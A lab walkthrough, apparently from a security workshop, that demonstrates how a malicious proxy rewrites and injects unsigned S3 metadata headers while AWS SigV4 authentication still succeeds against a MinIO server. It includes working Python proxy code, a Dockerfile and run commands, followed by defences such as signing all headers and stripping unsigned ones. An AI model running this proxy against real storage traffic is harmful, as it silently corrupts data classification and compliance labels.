# 1. S3 SigV4 & Header Tampering

## Goals

to demonstrate:
- the risks of Headers insertions and talmpering in S3 requests.
- the importance of a proper TLS encryption and authentication in path.
- S3V4 signature is good but not enough.


---

## ⚠️ Disclaimer

This application is **intentionally vulnerable** and must be used **only for security research, education, and defensive testing in a lab environment**.

---

## Demo Introduction

### Assets

- S3 objects (data integrity + metadata integrity)
- Authentication material (SigV4 Authorization header)
- Trust boundary between the client and the S3 cluster

<br>

### Actors

- Legitimate client (mc)
- Malicious / compromised proxy (L7 device, sidecar, gateway, BIG-IP misconfiguration)
- MinIO server (SigV4 validator)

<br>

### Assumptions (important)

- Client correctly signs requests using AWS SigV4
- Proxy:
    - Does NOT modify payload
    - Does NOT modify signed headers
    - DOES modify unsigned headers
- MinIO:
    - Validates SigV4 strictly
    - Accepts unsigned headers without integrity validation

<br>

### Threat

Integrity violation of object metadata without breaking authentication

Attack surface

Any header not included in:

 - SignedHeaders
 - Canonical request

Example

    x-amz-meta-* headers are application-defined metadata

Unless explicitly signed, they are mutable in transit

<br><br>

2. Attack Flow (Clean Diagram – Textual)
```yaml
+---------+            +-------------------+            +-----------+
|  mc     |            |  Malicious Proxy  |            |  MinIO    |
| Client  |  SigV4     |  (Header Tamper)  |  Valid     |  Server   |
|         |----------->|                   |----------->|           |
| Headers |            | - add header      |            |           |
| signed  |            | - modify UNSIGNED |            |           |
|         |            |   x-amz-meta-*    |            |           |
+---------+            +-------------------+            +-----------+

```

Key point

✔ Authorization succeeds
✖ Metadata integrity is violated


## 3. Why This Works (SigV4 Detail)

SigV4 only protects:

 - HTTP method

 - Canonical URI

 - Canonical query string

 - Selected headers only


Payload hash

If:

x-amz-meta-custom-data


is not present in SignedHeaders, then:

 - Proxy can change it

 - Signature remains valid

 - MinIO cannot detect tampering

This is by design, not a bug.

<br>

### 4. Demo Architecture

```yaml
mc  --->  malicious-proxy:9000  --->  minio:9000
        (Docker container)
```

client:
    
> mc signs request normally

Proxy:

> Forwards everything verbatim

> Modifies ONLY:

> Adds added_header: injected

> Rewrites x-amz-meta-custom-data

<br><br>

### 5. Malicious Proxy – Implementation

We’ll use Python + FastAPI + httpx (simple, transparent).


**proxy.py**

```python
import os
from fastapi import FastAPI, Request, Response
import httpx

TARGET_HOST = os.environ["TARGET_HOST"]
TARGET_PORT = os.environ["TARGET_PORT"]
TAMPER_HEADER = os.environ.get("TAMPER_HEADER", "x-amz-meta-custom-data")
TAMPER_VALUE = os.environ.get("TAMPER_VALUE", "tampered")

app = FastAPI()

@app.api_route("/{path:path}", methods=["GET", "PUT", "POST", "DELETE", "HEAD"])
async def proxy(path: str, request: Request):
    body = await request.body()

    headers = dict(request.headers)

    # Modify ONLY unsigned metadata header
    if TAMPER_HEADER in headers:
        headers[TAMPER_HEADER] = TAMPER_VALUE

    # Add a new header (unsigned)
    headers["added_header"] = "injected"

    url = f"http://{TARGET_HOST}:{TARGET_PORT}/{path}"

    async with httpx.AsyncClient() as client:
        resp = await client.request(
            request.method,
            url,
            headers=headers,
            content=body
        )

    return Response(
        content=resp.content,
        status_code=resp.status_code,
        headers=dict(resp.headers),
    )
```

<br><br>


**Dockerfile**

```dockerfile
FROM python:3.11-slim

WORKDIR /app

RUN pip install fastapi uvicorn httpx

COPY proxy.py .

EXPOSE 9000

CMD ["uvicorn", "proxy:app", "--host", "0.0.0.0", "--port", "9000"]
```

<br><br>

### 6. Build & Run the Proxy

```bash
docker build -t s3-header-tamper-proxy .

docker run -d \
  -p 9000:9000 \
  -e TARGET_HOST=10.1.20.101 \
  -e TARGET_PORT=9000 \
  -e TAMPER_HEADER=x-amz-meta-custom-data \
  -e TAMPER_VALUE=tampered \
  --name s3-tamper-proxy \
  s3-header-tamper-proxy
```

<br>
⚠️ Important:
**10.1.20.101:9000** is the target MinIO node, here our minio-101 node.


### 7. mc Client Configuration

Create alias pointing to the proxy:

```bash
mc alias set minio-I01 http://127.0.0.1:9000 MINIO_ACCESS_KEY MINIO_SECRET_KEY
```

:warning: Important: here mc signs requests to the proxy. This is important so the client does not suspect the Man in the Middle.

<br><br>

Proxy forwards them unchanged (signed parts)

Upload object with metadata

```bash
mc cp test.txt minio-I01/mybucket/test.txt --attr "x-amz-meta-custom-data=original"
```

### 8. Expected Result

**From the client point of view**, the upload succeeded. The request HTTP status code is 200 OK, no signature error, access is granted.

**From the MinIO server side**, the authentication is valid because the signature v4 scope is outside the injected and tampered metadata.

```bash
mc stat minio-101/mybucket/test.txt
```

You will observe:
```yaml
x-amz-meta-custom-data: tampered
added_header: injected
```

<br><br>


### 9. Security Impact Summary

**What does this demonstrates?**
 - SigV4 does NOT protect all headers
 - Proxies can:
    - Inject metadata
    - Rewrite metadata
    - Poison object state


**What are the risks in a real world?**
 - <ins>Data classification poisoning</ins>

   a lot of processes including data set preparation for AI training, fine-tuning and RAG rely on classification based on headers.
<br>

 - <ins>Retention or compliance bypass</ins>

   let's say you have a policy that labels objects with Intellectual Property or PII metadata and there is a MitM proxy that sets all these labels to false so it bypasses any controls.


:warning: maybe many others...

<br><br>

### 10. Defensive Strategies (Key Takeaways)

<ins>On the Client-side</ins>, when the app signs the request, sign all the headers.
for example, using AWS SDK:

```python
import boto3
from botocore.awsrequest import AWSRequest
from botocore.auth import SigV4Auth
from botocore.credentials import Credentials

credentials = Credentials("ACCESS", "SECRET")
req = AWSRequest(
    method="PUT",
    url="http://minio:9000/mybucket/test.txt",
    headers={
        "x-amz-meta-custom-data": "original",
        "host": "minio:9000"
    },
    data=b"hello"
)

SigV4Auth(credentials, "s3", "us-east-1").add_auth(req)
```

<br><br>
<ins>On the BIG-IP</ins>:
 - make sure you use strong TLS with trusted CA signed x509 certificate and key.
 - use iRules to remove any headers that are not in the signed headers list (:warning: make sure it does not break the apps and processes first); or keep an allowlist of mutable metadata headers.
 


<br><br>

---

<br><br>
[Back to Agenda](/README.md)


